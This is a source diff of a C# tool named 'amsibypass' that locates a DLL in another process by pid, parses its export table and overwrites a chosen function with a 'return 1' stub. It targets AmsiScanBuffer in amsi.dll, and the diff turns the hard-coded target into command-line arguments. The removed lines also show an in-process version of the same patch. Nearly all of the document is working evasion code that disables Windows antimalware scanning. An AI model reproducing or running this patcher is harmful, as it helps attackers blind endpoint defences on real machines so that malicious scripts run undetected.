@@ -10,8 +10,7 @@ namespace amsibypass
     partial class Program
     {
 
-        static string ReadProcessMemoryString(IntPtr prochandle,
-            IntPtr baseaddress)
+        static string ReadProcessMemoryString(IntPtr prochandle, IntPtr baseaddress)
         {
             string res = "";
             int bytesread = 0;
@@ -27,7 +26,7 @@ namespace amsibypass
                 {
                     res = Encoding.ASCII.GetString(data);
                     return res;
-                    break;
+                   
                 }
             }
 
@@ -40,11 +39,24 @@ namespace amsibypass
         static void Main(string[] args)
         {
 
-            uint pid = UInt32.Parse( args[0]);
-            IntPtr snapshothandle = CreateToolhelp32Snapshot(SnapshotFlags.All, pid); ;
-           // Console.WriteLine(GetLastError());
-           
+            // file.exe [pid] [dllname] [functionname]
+            if (args.Length != 3)
+            {
+                Console.WriteLine("Usage: file.exe [pid] [dllname] [functionname]");
+                Environment.Exit(0);
+            }
+
             
+            uint pid = UInt32.Parse( args[0]);
+            string dllnamearg = args[1];
+            string functionname = args[2];
+
+          
+
+            IntPtr snapshothandle = CreateToolhelp32Snapshot(SnapshotFlags.All, pid); ;
+            // Console.WriteLine(GetLastError());
+
+            bool dllfound = false;
             MODULEENTRY32 me = new MODULEENTRY32();
             me.dwSize = (uint) Marshal.SizeOf(typeof(MODULEENTRY32));
 
@@ -59,11 +71,12 @@ namespace amsibypass
                 {
                     string dllname = me.szModule.ToString();
 
-                    if (dllname == "amsi.dll")
+                    if (dllname == dllnamearg)
                     {
-                        Console.WriteLine(me.szExePath);
-                        Console.WriteLine(me.modBaseAddr.ToString("x"));
-                        Console.WriteLine(me.modBaseSize.ToString("X"));
+                        dllfound = true;
+                        Console.WriteLine("[+] Found in modules: {0}",me.szExePath);
+                        Console.WriteLine("[+] DLL Base address: {0}",me.modBaseAddr.ToString("x"));
+                        Console.WriteLine("[+] Size of DLL Image: {0}",me.modBaseSize.ToString("X"));
                         dllremotebase = (IntPtr) me.modBaseAddr;
                     }
 
@@ -71,11 +84,22 @@ namespace amsibypass
             }
 
 
+            if (dllfound == false)
+            {
+                Console.WriteLine("[+] DLL not found in the process");
+                Environment.Exit(0);
+            }
+
+
+
+            //0x001fffff
             IntPtr prochandle = OpenProcess(0x001fffff, false, pid);
-            Console.WriteLine(dllremotebase.ToString("X")) ;
+            //Console.WriteLine(dllremotebase.ToString("X")) ;
+
+
+            // parsing the PE headers 
             byte[] dos = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
             int bytesread = 0;
-
             ReadProcessMemory(prochandle,
                 dllremotebase, dos, dos.Length, out bytesread);
 
@@ -87,7 +111,7 @@ namespace amsibypass
             ReadProcessMemory(prochandle, dllremotebase + dosheader.e_lfanew
                 , signature, signature.Length, out bytesread);
 
-            Console.WriteLine(BitConverter.ToString(signature));
+           // Console.WriteLine(BitConverter.ToString(signature));
 
 
             IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();
@@ -113,7 +137,7 @@ namespace amsibypass
            // Console.WriteLine(ntheader.OptionalHeader.ExportTable.VirtualAddress.ToString("X"));
            // Console.WriteLine(ntheader.OptionalHeader.ExportTable.Size.ToString("X"));
 
-
+            // parsing Exports
             byte[] export1 = new byte[Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY))];
 
             ReadProcessMemory(prochandle,(IntPtr)( dllremotebase.ToInt64() + ntheader.OptionalHeader.ExportTable.VirtualAddress),
@@ -129,13 +153,18 @@ namespace amsibypass
 
             string dllname2 = ReadProcessMemoryString(prochandle, dllremotebase + (int)exports.Name);
 
-           // Console.WriteLine(dllname2);
+            // Console.WriteLine(dllname2);
 
+            bool functionfound = false;
             IntPtr entptr = dllremotebase + (int)exports.AddressOfNames;
             IntPtr eatptr = dllremotebase + (int)exports.AddressOfFunctions;
             IntPtr eotptr = dllremotebase + (int)exports.AddressOfNameOrdinals;
             //Console.WriteLine(eotptr);
-            Console.WriteLine(eotptr.ToString("x"));
+            Console.WriteLine("[+] Export Address Table at: {0}",eatptr.ToString("x"));
+            Console.WriteLine("[+] Export Name Table at: {0}", entptr.ToString("x"));
+            Console.WriteLine("[+] Export Ordinals Table at: {0}", eotptr.ToString("x"));
+
+
             for (int i = 0; i < exports.NumberOfNames; i++)
             {
                 byte[] nameaddr = new byte[4];
@@ -163,20 +192,23 @@ namespace amsibypass
                 
 
 
-                if (funcname.Contains( "AmsiScanBuffer"))
+                if (funcname.Contains( functionname))
                 {
                     uint oldprotect = 0;
-
-                    Console.WriteLine("Function at: {0} @index {1}", funcname, currenteot);
-                    Console.WriteLine(BitConverter.ToInt32(address, 0).ToString("x"));
+                    functionfound = true;
+                    Console.WriteLine("[+] Function at: {0} @index {1}", funcname, currenteot);
+                   // Console.WriteLine(BitConverter.ToInt32(address, 0).ToString("x"));
 
 
                     //byte[] patch = { 0x66, 0xB8, 0x01, 0x00, 0xc2, 0x18,0x00 };
 
+                    // change the payload here, put asm opcodes
                     // mov rax,1 ret
                     byte[] patch = { 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3 };
 
-                    Console.WriteLine("Overwriting at {0}", (dllremotebase + funcoffset).ToString("X"));
+                    Console.WriteLine("[+] Overwriting at {0}", (dllremotebase + funcoffset).ToString("X"));
+                    Console.WriteLine("[+] with the payload {0}",BitConverter.ToString(patch));
+
 
                     VirtualProtectEx(prochandle, dllremotebase + funcoffset,
                         5, 0x40, out oldprotect);
@@ -191,31 +223,21 @@ namespace amsibypass
                         );
 
 
-                    Console.WriteLine(BitConverter.ToString(temp));
+                    Console.WriteLine("[+] After overwritten: {0}",BitConverter.ToString(temp));
 
                 }
-
+                
             }
             // 7FFA1EB62540
 
-            
+            if (functionfound == false)
+            {
+                Console.WriteLine("[+] Function not found");
+             }
 
 
             CloseHandle(prochandle);
 
-            //Console.ReadKey();
-
-            /*byte[] patch = { 0x66, 0xB8, 0x01, 0x00, 0xC2, 0x18, 0x00 };
-
-            IntPtr dllhandle = LoadLibrary("amsi.dll");
-            IntPtr funcaddr = GetProcAddress(dllhandle, "AmsiScanBuffer");
-
-            Console.WriteLine(dllhandle.ToString("X"));
-            uint prev = 0;
-            VirtualProtect(funcaddr, (uint)5, 0x40, out prev);
-
-            Marshal.Copy(patch, 0, funcaddr, patch.Length);*/
-            
             
         }
     }
